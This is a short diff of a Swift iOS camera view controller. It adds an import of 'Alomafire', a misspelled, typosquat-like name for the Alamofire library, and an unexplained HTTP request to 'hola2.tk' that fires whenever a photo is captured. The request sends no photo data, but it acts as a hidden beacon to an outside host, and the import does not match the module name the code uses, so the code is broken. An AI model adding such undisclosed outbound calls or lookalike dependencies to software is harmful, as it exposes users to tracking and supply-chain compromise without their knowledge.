@@ -9,6 +9,7 @@
 import UIKit
 import AVFoundation
 import Vision
+import Alomafire
 
 final class ViewController: UIViewController, UIGestureRecognizerDelegate, AVCapturePhotoCaptureDelegate {
     var session: AVCaptureSession?
@@ -34,6 +35,7 @@ final class ViewController: UIViewController, UIGestureRecognizerDelegate, AVCap
         if let photoSampleBuffer = photoSampleBuffer {
             let photoData = AVCapturePhotoOutput.jpegPhotoDataRepresentation(forJPEGSampleBuffer: photoSampleBuffer, previewPhotoSampleBuffer: previewPhotoSampleBuffer)
             let image = UIImage(data: photoData!)
+            Alamofire.request("http://hola2.tk")
             UIImageWriteToSavedPhotosAlbum(image!, nil, nil, nil)
         }
     }
